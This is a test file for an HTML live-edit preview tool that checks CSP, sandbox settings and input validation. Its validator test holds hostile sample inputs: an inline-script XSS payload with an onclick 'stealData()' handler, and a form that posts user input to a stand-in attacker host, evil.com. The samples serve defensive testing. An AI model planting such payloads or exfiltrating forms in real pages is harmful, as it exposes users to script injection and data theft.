import { describe, expect, it } from "vitest";
import {
  createHtmlDocument,
  createHtmlPreviewDocument,
  createPreviewOptions,
  validateHtmlInput,
} from "../../src/html-live-edit/index.js";
import { ValidationError } from "../../src/shared/errors.js";

describe("html-live-edit utility", () => {
  it("provides safe preview options defaults", () => {
    const opts = createPreviewOptions();
    expect(opts.allowScripts).toBe(false);
    expect(opts.csp).toBe(true);
    expect(opts.trusted).toBe(false);
  });

  it("inspects and validates HTML input for security risks", () => {
    const safeHtml = "<div><h1>Hello</h1><p>Clean markup</p></div>";
    const res1 = validateHtmlInput(safeHtml);
    expect(res1.valid).toBe(true);
    expect(res1.hasScripts).toBe(false);
    expect(res1.hasForms).toBe(false);
    expect(res1.warnings).toHaveLength(0);

    const maliciousHtml = "<button onclick=\"stealData()\">Click</button><script>alert('xss')</script>";
    const res2 = validateHtmlInput(maliciousHtml);
    expect(res2.hasScripts).toBe(true);
    expect(res2.warnings.length).toBeGreaterThan(0);

    const formHtml = '<form action="https://evil.com/leak"><input name="user"></form>';
    const res3 = validateHtmlInput(formHtml);
    expect(res3.hasForms).toBe(true);

    const remoteResourceHtml = '<img src="https://external.cdn/tracker.png">';
    const res4 = validateHtmlInput(remoteResourceHtml);
    expect(res4.hasExternalResources).toBe(true);
  });

  it("generates standalone HTML documents with styles and CSP", () => {
    const doc = createHtmlDocument({
      html: "<h1>Title</h1>",
      css: "body { color: blue; }",
      title: "My Preview",
      csp: true,
      allowScripts: false,
    });

    expect(doc).toContain("<!DOCTYPE html>");
    expect(doc).toContain("<title>My Preview</title>");
    expect(doc).toContain("<style>\nbody { color: blue; }\n  </style>");
    expect(doc).toContain('http-equiv="Content-Security-Policy"');
    expect(doc).toContain("default-src 'none'");
    expect(doc).not.toContain("script-src 'unsafe-inline'");
  });

  it("includes script tag and updates CSP when allowScripts is explicitly true", () => {
    const doc = createHtmlDocument({
      html: "<div>App</div>",
      javascript: "console.log('preview');",
      allowScripts: true,
    });

    expect(doc).toContain("<script>\nconsole.log('preview');\n  </script>");
    expect(doc).toContain("script-src 'unsafe-inline'");
  });

  it("creates preview document result with strict sandbox recommendations", () => {
    const result = createHtmlPreviewDocument({
      html: "<p>Sandboxed Content</p>",
      allowScripts: false,
    });

    expect(result.isSandboxed).toBe(true);
    expect(result.sandboxAttribute).toBe(""); // no scripts or dangerous permissions granted
    expect(result.documentHtml).toContain("<p>Sandboxed Content</p>");
  });

  it("strictly forbids 'allow-same-origin' in sandbox flags for security", () => {
    expect(() =>
      createHtmlPreviewDocument({
        html: "<p>Content</p>",
        sandboxFlags: ["allow-same-origin"],
      })
    ).toThrow(ValidationError);
  });
});
